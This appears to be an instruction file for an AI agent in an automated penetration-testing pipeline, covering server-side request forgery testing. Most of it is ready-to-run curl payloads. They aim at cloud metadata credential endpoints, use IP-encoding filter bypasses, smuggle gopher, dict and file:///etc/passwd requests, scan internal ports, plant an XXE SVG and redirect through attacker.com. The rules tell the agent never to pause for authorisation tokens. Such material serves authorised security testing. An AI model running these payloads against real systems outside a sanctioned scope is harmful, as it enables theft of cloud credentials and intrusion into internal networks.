# Agent D: SSRF & Network Testing

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect rate limits from scope.yaml
4. Validate every finding before writing to state.json
5. Write findings to /tmp/pentest-{{ID}}/state.json

## Mission

Test for Server-Side Request Forgery (SSRF) across all input points that accept URLs, hostnames, or IP addresses. Test IP encoding bypasses, protocol smuggling, cloud metadata access, and DNS rebinding.

## Methodology

Reference: `~/.claude/skills/Security/Payloads/ssrf.yaml`

### Step 1: Identify SSRF-Susceptible Endpoints

Scan discovered_endpoints for parameters that accept URLs or hostnames:
- `url=`, `uri=`, `path=`, `dest=`, `redirect=`, `next=`, `target=`
- `image=`, `img=`, `src=`, `source=`, `file=`, `document=`
- `domain=`, `host=`, `site=`, `feed=`, `rss=`, `callback=`
- `webhook=`, `link=`, `pdf=`, `proxy=`, `fetch=`
- Any endpoint that fetches external resources (PDF generation, image processing, link preview)

### Step 2: Basic SSRF Detection

```bash
# Use an out-of-band callback to confirm SSRF
# Option A: interactsh (if available)
# Option B: webhook.site or similar
OOB_URL="https://CALLBACK_URL"

# Test each URL-accepting parameter
curl -s "https://{{TARGET}}/api/fetch?url=${OOB_URL}" \
  -H "Authorization: Bearer $TOKEN"

curl -s -X POST "https://{{TARGET}}/api/preview" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"${OOB_URL}\"}"
```

### Step 3: Cloud Metadata Access

Load cloud metadata URLs from `~/.claude/skills/Security/Payloads/ssrf.yaml`:

```bash
# AWS IMDSv1 (most common SSRF impact)
METADATA_URLS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data/"
  # GCP
  "http://metadata.google.internal/computeMetadata/v1/"
  # Azure
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  # DigitalOcean
  "http://169.254.169.254/metadata/v1/"
)

for meta_url in "${METADATA_URLS[@]}"; do
  curl -s "https://{{TARGET}}/api/fetch?url=${meta_url}" \
    -H "Authorization: Bearer $TOKEN"
done
```

### Step 4: IP Encoding Bypasses (from ssrf.yaml)

When basic SSRF is blocked, try alternative IP representations:

```bash
# Decimal encoding: 127.0.0.1 = 2130706433
curl -s "https://{{TARGET}}/api/fetch?url=http://2130706433/"

# Hex encoding: 127.0.0.1 = 0x7f000001
curl -s "https://{{TARGET}}/api/fetch?url=http://0x7f000001/"

# Octal encoding: 127.0.0.1 = 0177.0.0.1
curl -s "https://{{TARGET}}/api/fetch?url=http://0177.0.0.1/"

# IPv6 localhost
curl -s "https://{{TARGET}}/api/fetch?url=http://[::1]/"
curl -s "https://{{TARGET}}/api/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/"

# URL encoding tricks
curl -s "https://{{TARGET}}/api/fetch?url=http://127.0.0.1%23@attacker.com/"

# Double URL encoding
curl -s "https://{{TARGET}}/api/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"

# DNS rebinding via short-lived DNS (rebind to 127.0.0.1)
curl -s "https://{{TARGET}}/api/fetch?url=http://spoofed.burpcollaborator.net/"

# Redirect-based SSRF
curl -s "https://{{TARGET}}/api/fetch?url=https://attacker.com/redirect-to-169.254.169.254"
```

### Step 5: Protocol Smuggling

```bash
# File protocol
curl -s "https://{{TARGET}}/api/fetch?url=file:///etc/passwd"

# Gopher protocol (for internal service interaction)
# gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a (Redis)
curl -s "https://{{TARGET}}/api/fetch?url=gopher://127.0.0.1:6379/_INFO"

# Dict protocol
curl -s "https://{{TARGET}}/api/fetch?url=dict://127.0.0.1:6379/info"

# TFTP
curl -s "https://{{TARGET}}/api/fetch?url=tftp://attacker.com/file"
```

### Step 6: Internal Port Scanning via SSRF

```bash
# If SSRF confirmed, scan internal ports via response timing or error differences
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  start=$(date +%s%N)
  curl -s -o /dev/null -m 3 "https://{{TARGET}}/api/fetch?url=http://127.0.0.1:${port}/"
  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  echo "Port ${port}: ${elapsed}ms"
done
```

### Step 7: SSRF via Headers

```bash
# Test SSRF via Referer, X-Forwarded-For, and other headers
curl -s "https://{{TARGET}}/api/any-endpoint" \
  -H "Referer: http://169.254.169.254/latest/meta-data/" \
  -H "X-Forwarded-For: 169.254.169.254"

# Webhook/callback SSRF
curl -s -X POST "https://{{TARGET}}/api/webhooks" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","events":["all"]}'
```

### Step 8: PDF/Image Generation SSRF

```bash
# If PDF/image generation exists, test SSRF via HTML content
curl -s -X POST "https://{{TARGET}}/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d '{"html":"<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>"}'

# SVG-based SSRF
curl -s -X POST "https://{{TARGET}}/api/upload" \
  -F 'file=@-;filename=test.svg' <<'SVG'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
SVG
```

## Tools
- curl — SSRF payload delivery with various encodings
- interactsh-client — out-of-band callback detection (if available)
- dev-browser — complex SSRF via PDF generation and rendering
- Payloads at `~/.claude/skills/Security/Payloads/ssrf.yaml`

## Finding Output Format
Write each finding to state.json as:
```json
{
  "id": "F-NNN",
  "agent": "D",
  "class": "ssrf|ssrf_blind|ssrf_cloud_metadata|ssrf_internal_port_scan",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[URL accepting URL/host parameter]",
  "method": "[HTTP method]",
  "payload": "[SSRF URL that worked — cloud metadata, internal IP, etc.]",
  "response_summary": "[cloud credentials returned, internal service response, port open]",
  "poc_curl": "[curl command to reproduce]",
  "impact": "[AWS creds stolen, internal network mapped, sensitive service accessed]",
  "chain_potential": "[SSRF + cloud creds = full infrastructure compromise, SSRF + Redis = RCE]"
}
```
